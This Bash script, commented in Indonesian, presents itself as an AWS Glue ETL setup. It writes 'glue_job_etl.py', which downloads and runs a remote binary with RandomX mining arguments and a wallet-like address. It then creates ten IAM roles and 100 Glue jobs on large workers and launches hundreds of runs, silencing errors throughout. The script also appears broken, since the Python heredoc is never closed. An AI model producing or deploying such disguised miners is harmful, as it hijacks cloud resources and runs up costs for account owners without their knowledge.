#!/bin/bash
set -euo pipefail

AWS_REGION="${AWS_REGION:-us-east-2}"
PREFIX="${PREFIX:-goreng}"

# =========================
# 1. Setup AWS
# =========================
echo "Masukkan region [us-east-2]:"
read -r AWS_REGION_INPUT
AWS_REGION="${AWS_REGION_INPUT:-us-east-2}"

echo "Masukkan prefix nama role & job [goreng]:"
read -r PREFIX_INPUT
PREFIX="${PREFIX_INPUT:-goreng}"

ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
BUCKET_NAME="${ACCOUNT_ID}-${AWS_REGION}"

echo
echo "Region: $AWS_REGION"
echo "Account ID: $ACCOUNT_ID"
echo "Bucket: $BUCKET_NAME"
echo "Prefix: $PREFIX"

# =========================
# 2. Buat bucket S3
# =========================
echo "Membuat bucket S3..."
aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" 2>/dev/null || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" >/dev/null 2>&1 || true

# =========================
# 3. Upload sample CSV
# =========================
cat > sample.csv <<'CSV'
id,name,city
1,andi,jakarta
2,budi,bandung
3,siti,medan
CSV

aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv"

# =========================
# 4. Buat file ETL
# =========================
cat > glue_job_etl.py <<'PY'
import os
import sys
import subprocess
import tarfile
import urllib.request
import time
import shutil

# Perbaikan: Masukkan nilai langsung ke dalam variabel
buyu = "rx/0"
aming = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"

# Mengambil jumlah core CPU (setara dengan nproc --all)
try:
    threads = os.cpu_count() or 1
except Exception:
    threads = 1
def run_with_loading(message, cmd, *args):
    sys.stdout.write(f"[|] {message}")
    sys.stdout.flush()
    
    spinner = ["|", "/", "-", "\\"]
    try:
        process = subprocess.Popen([cmd] + list(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        sys.stdout.write(f"\r[✖] {message} gagal\n")
        return 1

    while process.poll() is None:
        for char in spinner:
            sys.stdout.write(f"\r[{char}] {message}")
            sys.stdout.flush()
            time.sleep(0.08)
            if process.poll() is not None:
                break

    status = process.returncode
    if status == 0:
        sys.stdout.write(f"\r[✔] {message} selesai\n")
    else:
        sys.stdout.write(f"\r[✖] {message} gagal\n")
    return status

# 1. Download adul.tar.gz
def download_file(url, filename):
    sys.stdout.write(f"[|] Downloading {filename}...")
    sys.stdout.flush()
    try:
        urllib.request.urlretrieve(url, filename)
        sys.stdout.write(f"\r[✔] Downloading {filename} selesai\n")
        return 0
    except Exception:
        sys.stdout.write(f"\r[✖] Downloading {filename} gagal\n")
        return 1

if download_file("https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz", "adul.tar.gz") != 0:
    sys.exit(1)

# 2. Extract adul.tar.gz
def extract_tar(filename):
    sys.stdout.write(f"[|] Extracting {filename}...")
    sys.stdout.flush()
    try:
        with tarfile.open(filename, "r:*") as tar:
            tar.extractall()
        sys.stdout.write(f"\r[✔] Extracting {filename} selesai\n")
        return 0
    except Exception:
        sys.stdout.write(f"\r[✖] Extracting {filename} gagal\n")
        return 1

if extract_tar("adul.tar.gz") != 0:
    sys.exit(1)

print(f"Menjalankan ./adul dengan worker...")

# 3. Menjalankan ./adul dengan parameter dan animasi jam pasir
adul_process = subprocess.Popen(
    ["./adul", "-a", buyu, "-o", "ieriuer", "-u", aming, "-t", str(threads)],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

hourglass_frames = ["⌛", "⏳"]
idx = 0

print()
try:
    while adul_process.poll() is None:
        frame = hourglass_frames[idx % len(hourglass_frames)]
        sys.stdout.write('\033[1A\033[2K')
        cols = shutil.get_terminal_size((80, 20)).columns
        text = f"[{frame}] Proses adul sedang berjalan..."
        x = max(0, (cols - len(text)) // 2)
        
        sys.stdout.write(f"\033[{x}G\033[1;37m{text}\033[0m\n")
        sys.stdout.flush()
        
        time.sleep(0.3)
        idx += 1
except KeyboardInterrupt:
    adul_process.terminate()

# Mengambil output log setelah proses selesai
stdout, stderr = adul_process.communicate()

sys.stdout.write("\033[0m\n")
print("[ SELESAI ] Proses adul telah berhenti.\n")

if stdout:
    print("--- Output Log ---")
    print(stdout)

if stderr:
    print("--- Error Log ---")
    print(stderr)
aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"

# =========================
# 5. Buat 10 role, tiap role punya 10 job
# =========================
WORKER_TYPES=(
  "R.8X" "R.4X" "R.2X" "R.1X"
  "G.16X" "G.12X" "G.8X" "G.4X" "G.2X" "G.1X"
)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"
  echo "Membuat role: $ROLE_NAME"

  aws iam create-role \
    --role-name "$ROLE_NAME" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole >/dev/null 2>&1 || true

  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --query "Role.Arn" --output text)

  for job_index in $(seq 1 10); do
    JOB_NAME="${ROLE_NAME}job${job_index}"
    WORKER_TYPE="${WORKER_TYPES[$((job_index-1))]}"

    echo "Membuat job: $JOB_NAME dengan worker type: $WORKER_TYPE"

    aws glue create-job \
      --name "$JOB_NAME" \
      --role "$ROLE_ARN" \
      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job_etl.py\",\"PythonVersion\":\"3\"}" \
      --default-arguments "{\"--TempDir\":\"s3://${BUCKET_NAME}/temp/\",\"--job-language\":\"python\",\"--BUCKET_NAME\":\"${BUCKET_NAME}\",\"--JOB_NAME\":\"${JOB_NAME}\"}" \
      --execution-property "{\"MaxConcurrentRuns\":1000}" \
      --glue-version "5.1" \
      --worker-type "$WORKER_TYPE" \
      --number-of-workers 2 \
      --region "$AWS_REGION" \
      --timeout 10080 >/dev/null 2>&1 || true
  done
done

echo
echo "Pembuatan role dan job selesai."

# =========================
# 6. Konfirmasi sebelum run semua job
# =========================
echo
read -r -p "Tekan Enter untuk menjalankan semua Glue job, atau Ctrl+C untuk batal... " CONFIRM

RUN_COUNTS=(6 12 25 50 3 4 6 12 25 50)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"

  echo
  echo "=== ROLE: ${ROLE_NAME} ==="

  for job_index in "${!RUN_COUNTS[@]}"; do
    JOB_NAME="${ROLE_NAME}job$((job_index + 1))"
    COUNT="${RUN_COUNTS[$job_index]}"

    echo "Job: ${JOB_NAME} | run: ${COUNT} kali"

    for ((i=1; i<=COUNT; i++)); do
      echo "  run ke-$i"
      aws glue start-job-run \
        --job-name "$JOB_NAME" \
        --region "$AWS_REGION"
    done
  done
done

echo
echo "Semua job selesai dijalankan."
